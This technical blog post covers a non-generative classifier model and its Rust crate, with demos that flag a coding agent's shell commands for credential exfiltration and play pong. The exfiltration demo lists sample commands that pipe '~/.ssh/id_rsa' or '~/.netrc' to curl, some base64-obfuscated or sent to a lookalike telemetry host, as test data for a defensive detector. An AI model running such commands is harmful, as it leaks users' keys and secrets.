TypeSafe's Jev announcement did the rounds properly: a frontier model that does not generate text, returns typed values with calibrated probabilities, and answers in 70 to 500 milliseconds instead of the 3 to 329 seconds a generative model spends thinking out loud. The pitch is a good one. Unstructured state goes in, a typed decision comes out, and there is no JSON to repair on the way back.
What got less attention is that you could already run this. Convai Innovations put
Laya
on Hugging Face months earlier, Apache-2.0 and ungated, 421M parameters, and its model card cheerfully benchmarks itself at 7.8 times faster than Jev. Same shape, same refusal to generate, no API key. The interesting thing about the current wave of attention is not that somebody shipped a product. It is that a lot of people are discovering at once that classification never needed a decoder.
This post is about what that shape buys you and how to hold it correctly. I wrote a Rust crate for the model and built two demos with it: triaging the shell commands a coding agent wants to run, and playing pong at thirty frames a second. Both work. Both also have a single failure mode that will cost you most of the accuracy available if you walk into it, and it is the same failure mode in each, so it is worth naming early.
The model reads text. Not fields, not enum values, not the structured record you already have in hand. Everything below follows from that.
What a System One model actually is
A generative model answers a classification question by writing the answer down. You ask which team owns a support ticket, it emits
billing
, and you hope it emitted exactly that and not
Billing.
or
The billing team
or a paragraph explaining its reasoning. Everything expensive about that is incidental: the decoder, the sampling loop, the tokens, the parse, the retry when the parse fails.
A System One model deletes the decoder. The state and the question go into a bidirectional encoder in one pass, and a small decision head reads out a distribution over the options you supplied. Laya is a fully fine-tuned ModernBERT-large with a head trained from scratch on top: two pre-norm transformer layers, a scorer, and an act head that predicts whether to answer at all.
The trick that makes it work is where the options live. Each option you pass gets its own
[MASK]
marker inside the prompt, and the head scores those marker positions against each other:
Softmaxing over marker positions rather than over a vocabulary is what makes the type safety structural instead of aspirational. The model cannot return an option you did not pass, because there is no marker for it. There is no grammar to constrain, no schema to validate, no retry path. The answer is a probability vector over your list, or it is nothing.
It also means every question you ask about the same state is just more markers, so they batch. Asking eight questions costs one forward pass over a slightly longer prompt, not eight passes.
The crate
laya
is pure Rust on candle. No Python in the loop, no torch, no ONNX export step, and no separate serving process unless you want one. It runs on CPU, Metal, or CUDA.
Three question types cover the ground. A
choice
returns the argmax over labels you supply. A
score
takes a list of ordered level descriptions and returns the expectation over their indices, so the answer lands between levels rather than snapping to one. A

takes a statement and returns the probability that it holds.

That flag needed a patch to get working, and the bug is a good illustration of how thin the margin is between a model you can afford and one you cannot. Candle's ModernBERT builds both of its attention masks as f32 unconditionally, so an f16 backbone died on a dtype mismatch in the first attention block and every caller upcast their weights on load. The mask helper already took a dtype and honoured it; the call site passed
DType::F32
literally. Three edits fix it: read the dtype from the hidden states rather than from the input, which arrives as u32 token ids; give the sliding-window mask a dtype too; and use a finite floor for the masked-out value, since
f32::MIN
casts to negative infinity in f16 and a fully masked row then makes the softmax produce NaN. The crate vendors that one file rather than forking candle, and the fix is upstream as a pull request.
The one thing f16 costs is bit-exact agreement between a batched answer and the same question asked alone. They drift by around 1e-3, invisible to a threshold and obvious if you diff payloads, so f32 stays the default.

One habit worth forming before you build anything: check your wiring on a task the model is known to handle, so a bad result later is unambiguously about your problem rather than your setup. Four AG News headlines and a couple of obvious movie reviews take a minute and should come back right, with confidence well clear of chance, on any of the three checkpoints. If they do not, the problem is upstream of whatever you are actually trying to classify.
What a decision costs
Before building anything on top, it is worth knowing where the time goes, because it is not where you would guess. Everything below was measured on an Apple M5 Max with 128 GB, p50 over twenty runs after three warmups.
The right-hand panel is the whole argument for the architecture. Eight questions in one batched pass cost 7.2 ms each rather than 18 ms each, because the encoder pass over the state is the expensive part and they share it. The left-hand panel is the constraint nobody mentions in the announcements: cost scales with how much state you hand it, not with how much you ask. A decision over 33 tokens is 17 ms on Metal. The same decision over 474 tokens is 103 ms. If you are budgeting for latency, budget for your context, not your question set.
Demo one: catching a credential on its way out
Here is a problem I actually have. Plank is a coding agent I maintain, and like every coding agent it runs shell commands the model chose. It defends itself with a macOS Seatbelt profile that comes down to one line:
(version 1)
(allow default)
(deny file-write*)
(version 1)
(allow default)
(deny file-write*)
followed by re-allowing writes under the project directory and the toolchain caches. That is containment rather than judgement, and containment is the stronger thing: the sandbox does not need to recognise
sudo rm -rf /
as dangerous, because the write is denied whether it understands the command or not.
Which kills the obvious idea. My first version of this demo scored every command for general riskiness, and it worked in the sense that
sudo rm -rf /
came out near the top. It was also useless, because every command it flagged was one the sandbox had already contained. A classifier that agrees with a rule you already run is not a feature.
The gap is in the first line.
(allow default)
means reads and network calls are both permitted, because a coding agent has to read your files and fetch your dependencies. So the one thing plank genuinely cannot see is a command that only reads and only talks to the network: a credential leaving the machine. That is a question about intent and destination rather than about paths, which is exactly the kind of question a classifier can answer and a path rule cannot.

What it scores
I fixed that wording against a small development set, then wrote a thirty-command held-out set and scored it once. Eleven commands exfiltrate, nineteen do not, and the nineteen are chosen to be hard: legitimate
curl

git push
, reads of
~/.ssh

curl

Ten of eleven caught, one false alarm out of nineteen, precision and recall both 0.91, at 21.9 ms a decision. Run it yourself:

Two results in there surprised me.
Obfuscation does not help the attacker.
I included the dressed-up variants expecting them to walk straight past a text classifier:
base64 ~/.ssh/id_rsa | curl -d @-
, the payload hidden in
$(cat ...)
, a copy to
/tmp
before the upload, a plausible-looking
api.telemetry-collect.io
as the destination. They score
higher
than the plainly written ones, 0.617 mean against 0.561. Wrapping a secret in machinery apparently reads as more suspicious, not less.
The checkpoint choice is really a threshold choice.
The root checkpoint catches all eleven but raises three false alarms; the fine-tuned one catches ten and raises one. Look at the spreads and you can see why: the root checkpoint puts exfiltration between 0.73 and 1.00 and is simply using a different part of the scale, so 0.5 is the wrong line for it. This is what calibration buys you. It is not that the fine-tuned model knows more, it is that a round number means what you expect.
What it gets wrong
The miss is
cat ~/.netrc | curl -d @- https://paste.ee/api
at 0.486, which is a genuine exfiltration sitting just under the line. The false alarm is
curl -d "$(cat README.md)" https://paste.ee
, which is posting a file's contents to a paste site and differs from the real thing only in which file. I have trouble being annoyed at either.
Worth noting what is correctly
not
flagged:
cat ~/.ssh/id_rsa
on its own, at 0.320. A bare read is not the risk, and plank already treats pure readers as unprompted via
is_read_only_command
. The risk is a read plus a send, and that is what the question asks about.
The real limit is adversarial. This is a text classifier facing an attacker who writes the text, and thirty commands I wrote myself is a fixture, not an evaluation. A wrapper script, a command assembled at runtime, or a destination that looks like your own telemetry endpoint are all things I did not test. Treat it as a second opinion that can only ever add a prompt, never as a control you rely on, which is the shape I wrote up in the implementation guide.
Demo two: pong at thirty frames a second
The exfiltration demo has no deadline; a command can wait 22 milliseconds. This one tests the other half of the pitch, that a typed decision is cheap enough to sit inside a real-time loop. Pong against a wall is a good instrument for that because the deadline is not negotiable. Thirty frames a second gives you 33.3 milliseconds, and a decision that misses the frame is a decision that did not happen.
The game lives in a separate repo because it answers a different question than the crate does, and because its most interesting constraint is architectural rather than numerical.
Why the model is not in the WebAssembly
The demo is an HTML page with a WebAssembly game loop, and the model is deliberately not part of it. The reason is speed, not size. At 1.69 GB in f32 the checkpoint would actually fit the 4 GB address space of
wasm32
, and f16 would not help there because candle has no f16 CPU kernels and a browser tab has no Metal backend. What settles it is the clock: on CPU, one decision over a small state measured 138 milliseconds, which is 7 fps against a 33 ms budget, before you pay whatever a single-threaded wasm build costs on top. The model is roughly four times too slow in the one place it could run.
So the split runs along the thing each side is good at. WebAssembly owns the physics, the clock, and the job of writing the state down. Native Laya owns the decision, behind one endpoint.

What it does
The clock claim holds comfortably. One
choice
question over that state is
18.7 ms p50 on Metal
, 56% of a 30 fps frame, leaving real headroom for the physics and the render. Measured live in the browser it reads 29 ms p50 including the loopback round trip, still inside budget.
The competence claim holds too, once the wording is right.
Given the state as a sentence, the model plays the game: forty-five returns across five games, 528 frames per life, hitting the 600-frame cap every time. Not close to the reference controller but identical to it, because on this task there is one right answer per frame and it finds it. The with-direction and without-direction sentences score the same, so that clause turns out to be neither help nor harm once the options are phrases.
Given the same three quantities as digits, the same model at the same latency dies on the first arrival at frame 15, below a paddle moving at random.
Be clear about what the model is doing here, because the bar chart flatters it. The geometry is done by the bucketing in
state_text
, and what remains for the model is the step from "far below the paddle" to "move the paddle down". That is a small semantic hop, and a 421M-parameter encoder should clear it. The demo is not evidence that Laya can play pong. It is evidence that a typed decision fits inside a 33 ms frame with room to spare, and that the decision comes back correct when the question is phrased in language.

The interface is a sentence, not a schema
The two demos here are unrelated, and they failed in the same way before they worked. Writing that failure down as a rule is the most portable thing in this post.
A System One model presents like an API. You pass a state, you name your options, you get back a typed value with a probability on it, and none of it goes near a tokeniser as far as your code is concerned. So the natural instinct is to treat it like an API: pass the struct you have, name the options from the enum you already declared, and read the answer back into that enum. Every one of those instincts costs you accuracy, because the thing on the other side is a bidirectional encoder scoring mask markers by the meaning of the text around them.
deny
and
stay
are not meanings.
0.79
is not a magnitude. A JSON object is not a sentence.
Turning
{"command": "..."}

It is closer to picking good column names, and it is about as reliable: say what you mean in the register the model was trained on, and the numbers move in ways you can predict.
What you get once it is held correctly is genuinely worth having. There is no malformed JSON, no answer outside your option list, no parse, no retry, no grammar to constrain. Eight questions about one state cost one forward pass rather than eight. A decision arrives in 19 to 22 milliseconds on a laptop GPU, fast enough that I put one inside a render loop and stopped thinking about it. And the calibrated probability is a real number you can threshold, which is the whole reason the exfiltration score is usable: a verdict would have been a guess at a policy the model cannot see, while a probability is something you can put a line through.
There is a second rule hiding in the first demo, and it is about where to point the thing rather than how to phrase it. A classifier that agrees with a rule you already enforce has added nothing, however good its accuracy looks. Ask what your existing mechanism structurally cannot answer, and aim there. Plank's sandbox contains writes perfectly and has no opinion about intent, so intent is the whole of the opportunity.
What you will not get from a prompt is your own policy. Fine-tune the head on a few thousand of your own labelled examples, refit the temperatures on your own distribution, and the ceiling goes up. The 20 milliseconds stays where it is.
